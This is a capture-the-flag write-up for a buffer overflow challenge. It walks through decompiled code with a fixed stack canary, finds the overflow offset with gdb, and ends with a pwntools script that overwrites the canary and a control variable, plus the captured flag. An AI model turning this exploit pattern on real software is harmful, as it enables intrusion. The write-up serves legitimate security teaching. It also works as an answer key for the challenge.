+++
title = 'Overflow Orchestra'
date = '2024-09-05'
authors = ["Achintya J"]
+++




This is how the canary is implemented here (This is the decompiled function through IDA)

		v6 = 0LL;
		v5 = 0x6C9B1F74;
		puts("Oops! I hope that wasn't your plan all along.");
		fflush(_bss_start);
		gets(v3, argv);
		v4 = v5 ^ 0x6C9B1F74;
		if ( v5 != 0x6C9B1F74 )
		{
		puts("Surprise! Something went wrong, didn't it?");
		puts("Who let the bugs out?");
		exit(1);
		}

This means, we effectively have the canary leaked... 

and,

		if ( v6 == 0xDEADBEEF )
		{
		puts("Well, I guess you've earned this...");
		system("cat flag.txt");
		}
		else
		{
		printf("code == 0x%llx\n", v6);
		printf("code != 0x%llx :(\n", 3735928559LL);
		puts("Well, that was unexpected...");
		}
		exit(0);
		}

This means, we still got to rewrite the `v6` variable. 

Let's analyse using `gdb`. Run the following commands in succession, 

		gdb ./vuln
		disassemble main

We can see in the disassembly that at the address `main+79` or `0x0000000000001238` there is an `xor` instruction. This is what we need to see, because we want to figure out the number of bytes we should write to change the value being xored. 

After running, we can enter this string "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" and see that the RAX registry contains, "Ab6Ab7Ab", which is at an offset of 48.

Hence, after 48 bytes, whatever is written is being xored with `0x6c9b1f74`. If we need the answer to be 0, we need to send in the same data here. We can also see this in the stack dump in ghidra,

		undefined main()
		undefined         AL:1           <RETURN>
		undefined8        Stack[-0x10]:8 ToRewrite                               XREF[3]:     001011f5(W), 
		undefined8        Stack[-0x18]:8 TheCanary                               XREF[2]:     001011fd(W), 
		undefined8        Stack[-0x20]:8 xored                                   XREF[2]:     0010123e(W), 
		undefined1[40]    Stack[-0x48]   input                                   XREF[1]:     00101223(*)  

We can see that right after the canary is the variable we want to rewrite into `0xdeadbeef`. Thus, this script will be do everything,

		from pwn import *
		context.binary = binary = ELF("./vuln")
		context.log_level = "critical"
		payload = flat([
			b"A"*48,
			p64(0x6c9b1f74),
			p32(0xdeadbeef)
			])
		p = remote('10.21.232.38', 7002)
		p.sendline(payload)
		p.interactive()

flag: `iitmCTF{0v3rfl0w_0p3r4_t1c}`
